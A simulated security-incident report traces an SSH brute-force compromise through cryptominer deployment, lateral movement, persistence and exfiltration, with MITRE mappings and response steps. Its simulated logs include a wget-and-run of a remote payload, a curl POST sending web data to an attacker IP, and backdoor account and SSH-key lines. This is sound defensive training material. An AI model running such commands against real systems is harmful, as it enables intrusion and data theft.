
# Full-Scale Security Incident Simulation

## Scenario: Brute Force → Successful Compromise → Privilege Escalation → Persistence Attempt

---

# Environment Overview

| Component     | Details                             |
| ------------- | ----------------------------------- |
| OS            | Ubuntu 22.04 LTS                    |
| Services      | SSH (22), Apache (80), MySQL (3306) |
| Public Access | SSH + Web exposed                   |
| Logging       | Local auth logs + central SIEM      |
| Monitoring    | Alert on failed logins (>10/min)    |

---

# Phase 1 – Initial Attack (Brute Force Recon)

## Event Trigger

SIEM generates alert:

> Alert: Excessive SSH Authentication Failures from External IP

---

## Log Evidence – `/var/log/auth.log`

```
Feb 13 01:12:03 server sshd[3021]: Failed password for root from 185.234.219.77 port 51122 ssh2
Feb 13 01:12:05 server sshd[3024]: Failed password for root from 185.234.219.77 port 51125 ssh2
Feb 13 01:12:07 server sshd[3028]: Failed password for admin from 185.234.219.77 port 51129 ssh2
Feb 13 01:12:09 server sshd[3032]: Failed password for user from 185.234.219.77 port 51131 ssh2
Feb 13 01:12:12 server sshd[3035]: Failed password for test from 185.234.219.77 port 51135 ssh2
```

### Pattern Recognition

* Same source IP
* Rapid interval (2–3 sec)
* Username enumeration
* Privileged account targeting

MITRE Mapping:

* T1110 – Brute Force
* T1087 – Account Discovery

---

# SOC Investigation – Deep Log Analysis

### Count Attempts

```bash
grep "185.234.219.77" /var/log/auth.log | wc -l
```

Result:

```
213
```

213 attempts in 7 minutes → High confidence automated attack.

---

# Phase 2 – Compromise Occurs

New log appears:

```
Feb 13 01:18:44 server sshd[3188]: Accepted password for admin from 185.234.219.77 port 51421 ssh2
```

⚠ Now this escalates from attempt → confirmed breach.

---

# Phase 3 – Post-Compromise Activity

Immediately after successful login:

```
Feb 13 01:19:01 server sudo: admin : TTY=pts/0 ; COMMAND=/bin/bash
Feb 13 01:19:04 server sudo: admin : TTY=pts/0 ; COMMAND=/usr/bin/wget http://malicious.site/payload.sh
Feb 13 01:19:05 server sudo: admin : TTY=pts/0 ; COMMAND=/bin/bash payload.sh
```

### Attacker Behavior Analysis

1. Elevates privilege
2. Downloads payload
3. Executes remote script

This suggests:

* Privilege escalation
* Malware deployment
* Possible persistence attempt

MITRE:

* T1059 – Command Execution
* T1105 – Ingress Tool Transfer
* T1068 – Privilege Escalation

---

# Phase 4 – Malware Simulation

After execution:

```
Feb 13 01:19:15 server systemd: Started suspicious-service.service
```

Process list:

```bash
ps aux | grep suspicious
```

Output:

```
root  4231  95.3  1.2  cryptominer
```

High CPU utilization observed.

```
top
```

CPU at 98%.

Now we classify this as:

> Confirmed Compromise with Malicious Payload Deployment

Severity: High

---

# Phase 5 – Containment Strategy

## Step 1 – Isolate System from Network

```bash
sudo ip link set eth0 down
```

Or firewall drop all outbound:

```bash
sudo iptables -P OUTPUT DROP
```

Goal: Stop data exfiltration.

---

## Step 2 – Block Attacker IP

```bash
sudo ufw deny from 185.234.219.77
```

---

## Step 3 – Disable Compromised Account

```bash
sudo passwd -l admin
```

---

# Phase 6 – Eradication

## Remove Malicious Process

```bash
sudo kill -9 4231
```

Remove file:

```bash
rm -f payload.sh
```

---

## Check Persistence Mechanisms

Check cron:

```bash
crontab -l
cat /etc/crontab
```

Check SSH keys:

```bash
cat ~/.ssh/authorized_keys
```

Check new users:

```bash
cat /etc/passwd | grep 1001
```

Check systemd services:

```bash
systemctl list-unit-files | grep suspicious
```

Remove malicious service.

---

# Phase 7 – Forensic Deep Dive

## Check Bash History

```bash
cat /home/admin/.bash_history
```

## Check for Data Exfiltration

```bash
grep "wget" /var/log/syslog
```

Check outbound traffic before isolation:

```bash
netstat -antp
```

Suspicious connection:

```
185.234.219.77:4444 ESTABLISHED
```

Reverse shell suspected.

MITRE:

* T1041 – Exfiltration Over C2 Channel

---

# Phase 8 – Recovery

## Actions Taken

* Rebuild server from clean image
* Restore data from backup
* Rotate all credentials
* Reset SSH keys
* Enforce MFA
* Patch system

```bash
sudo apt update && sudo apt upgrade
```

---

# Incident Timeline (Detailed)

| Time  | Event                    |
| ----- | ------------------------ |
| 01:12 | Brute force begins       |
| 01:18 | Successful login         |
| 01:19 | Privilege escalation     |
| 01:19 | Malware downloaded       |
| 01:20 | Crypto miner active      |
| 01:25 | SIEM escalates alert     |
| 01:28 | System isolated          |
| 01:40 | Malware removed          |
| 02:10 | Forensic review complete |
| 03:00 | System rebuilt           |

---

# Root Cause Analysis

| Weakness                        | Impact                  |
| ------------------------------- | ----------------------- |
| Password authentication enabled | Brute-force success     |
| No Fail2Ban                     | Unlimited attempts      |
| Weak password                   | Easy compromise         |
| No MFA                          | No secondary protection |
| Insufficient alert threshold    | Delay in response       |

---

# Preventive Improvements

## Immediate Controls

* Disable password-based SSH
* Enable Fail2Ban
* Enforce MFA
* Geo-IP blocking
* IDS deployment (Snort/Suricata)
* File integrity monitoring (AIDE)

---

## SIEM Rule Improvement

Alert when:

* > 5 failed logins in 1 min
* Any root login
* SSH login from new country
* Sudo command executed by new IP

---

# Enterprise Security Incident Simulation

## Multi-Stage Compromise: External Brute Force → Privilege Escalation → Lateral Movement → Data Exfiltration Attempt

---

# 9. Lateral Movement Analysis

Following confirmation of compromise on Host A (10.0.0.15), forensic log review identified outbound SSH and SMB scanning toward internal infrastructure.

## Evidence – Firewall and Syslog Entries

```
Feb 13 01:22:14 HostA kernel: SRC=10.0.0.15 DST=10.0.0.22 PROTO=TCP DPT=22 SYN
Feb 13 01:22:15 HostA kernel: SRC=10.0.0.15 DST=10.0.0.23 PROTO=TCP DPT=445 SYN
Feb 13 01:22:16 HostA kernel: SRC=10.0.0.15 DST=10.0.0.24 PROTO=TCP DPT=3306 SYN
```

### Assessment

The compromised host initiated reconnaissance activity against:

* SSH (22) – Linux remote administration
* SMB (445) – Windows file sharing
* MySQL (3306) – Database services

This behavior indicates internal service discovery consistent with post-exploitation pivoting.

Mapped to MITRE ATT&CK:

* T1046 – Network Service Scanning
* T1021 – Remote Services

---

# 10. Credential Harvesting and Reuse

Forensic analysis uncovered a file located in a temporary directory:

```
/tmp/.cache/.credentials.dump
```

Contents included plaintext credentials:

```
devops:DevOps@123
backup:Backup@2023
```

### Probable Sources

* Hardcoded credentials in deployment scripts
* Credential scraping from configuration files
* Reused passwords across systems

Shortly thereafter, Host B (10.0.0.22) logged the following:

```
Feb 13 01:24:03 HostB sshd[2122]: Accepted password for devops from 10.0.0.15 port 49221 ssh2
```

### Interpretation

The attacker successfully leveraged harvested credentials to pivot internally. This confirms lateral movement through credential reuse.

MITRE Mapping:

* T1003 – Credential Dumping
* T1078 – Valid Accounts

Severity escalated to **Critical** due to multi-host compromise.

---

# 11. Persistence Mechanisms on Secondary Host

On Host B, the following commands were observed:

```
Feb 13 01:25:01 HostB useradd attacker
Feb 13 01:25:04 HostB passwd attacker
Feb 13 01:25:10 HostB echo "ssh-rsa AAAAB3..." >> /home/devops/.ssh/authorized_keys
```

### Findings

The attacker established redundant persistence mechanisms:

1. Creation of a new privileged account
2. Modification of authorized SSH keys
3. Potential backdoor access independent of password authentication

MITRE Mapping:

* T1136 – Create Account
* T1098 – Account Manipulation
* T1053 – Scheduled Task/Job (if cron persistence later detected)

This reflects a deliberate attempt to maintain long-term access.

---

# 12. Data Discovery and Collection

Log analysis revealed staging activity:

```
Feb 13 01:27:14 HostB tar -czf /tmp/webdata.tar.gz /var/www/html
Feb 13 01:27:19 HostB ls /etc/
Feb 13 01:27:25 HostB cat /var/www/html/config.php
```

### Assessment

The attacker identified:

* Web application files
* Configuration files (possible database credentials)
* Sensitive application logic

This aligns with:

* T1083 – File and Directory Discovery
* T1005 – Data from Local System

---

# 13. Exfiltration Attempt

Outbound network logs show:

```
Feb 13 01:27:41 HostB curl -X POST http://185.234.219.77/upload --data-binary @/tmp/webdata.tar.gz
```

Simultaneously:

```
ESTABLISHED 10.0.0.22:44122 → 185.234.219.77:80
```

### Interpretation

The attacker attempted HTTP-based exfiltration to external C2 infrastructure.

MITRE Mapping:

* T1041 – Exfiltration Over C2 Channel

At this point, incident classification changed to:

> Confirmed Data Exfiltration Attempt – Multi-Host Compromise

---

# 14. Enterprise Containment Actions

Given the scale of compromise, containment strategy transitioned from host-level to network-level controls.

## Immediate Actions

### 1. Network Isolation

* Disabled inter-subnet routing for affected VLAN
* Blocked outbound traffic from compromised hosts

```
iptables -A FORWARD -s 10.0.0.0/24 -j DROP
```

### 2. Account Revocation

* Disabled all compromised user accounts
* Forced global password reset
* Revoked all SSH keys organization-wide

### 3. Indicator Blocking

* Blocked malicious IP and associated ASN at firewall perimeter
* Updated IDS signatures

---

# 15. Forensic Validation and Integrity Checks

To ensure no residual persistence:

## 1. Account Audit

```
cat /etc/passwd
cat /etc/shadow
```

## 2. SSH Key Audit

```
find /home -name authorized_keys
```

## 3. Cron Jobs

```
crontab -l
ls -la /etc/cron.*
```

## 4. Systemd Services

```
systemctl list-unit-files --state=enabled
```

## 5. Binary Integrity Verification

```
debsums -s
```

## 6. Rootkit Detection

```
rkhunter --check
chkrootkit
```

Memory acquisition was performed for deeper analysis to detect:

* In-memory reverse shells
* Credential artifacts
* Fileless malware

---

# 16. Recovery Strategy

Given confirmed lateral movement and exfiltration attempt, the organization adopted a **Rebuild-from-Golden-Image** approach.

## Recovery Steps

1. Full disk wipe of compromised hosts
2. OS reinstallation from verified baseline image
3. Patch to latest security level
4. Deployment of EDR agent
5. Reintegration into segmented network
6. Monitoring under heightened alert status

All credentials were rotated, including:

* Service accounts
* Database accounts
* API keys
* Cloud credentials (if integrated)

---

# 17. Root Cause Analysis

Primary contributing factors:

1. Password-based SSH authentication enabled
2. Weak password hygiene
3. Absence of brute-force protection (Fail2Ban not deployed)
4. No multi-factor authentication
5. Flat internal network architecture (no segmentation)
6. Reused credentials across systems

---

# 18. Impact Assessment

| Category        | Impact                                               |
| --------------- | ---------------------------------------------------- |
| Confidentiality | Moderate (web data accessed, exfil attempt detected) |
| Integrity       | Potential risk (malicious processes executed)        |
| Availability    | Minor disruption during containment                  |
| Reputation      | Internal risk; no public disclosure required         |

No ransomware deployment observed. No confirmed encryption activity.

---

# 19. Preventive Security Improvements

## Short-Term Controls

* Disable password-based SSH globally
* Enforce MFA for all privileged accounts
* Deploy Fail2Ban
* Implement account lockout policies
* Deploy centralized log aggregation
* Tune SIEM alert thresholds

## Medium-Term Controls

* Network segmentation (Zero Trust model)
* Privileged Access Management (PAM)
* Password vaulting
* Credential rotation automation
* Host-based intrusion detection

## Long-Term Strategy

* Implement EDR across all endpoints
* Deploy behavioral analytics
* Regular red team exercises
* Continuous vulnerability management
* Threat intelligence feed integration

---




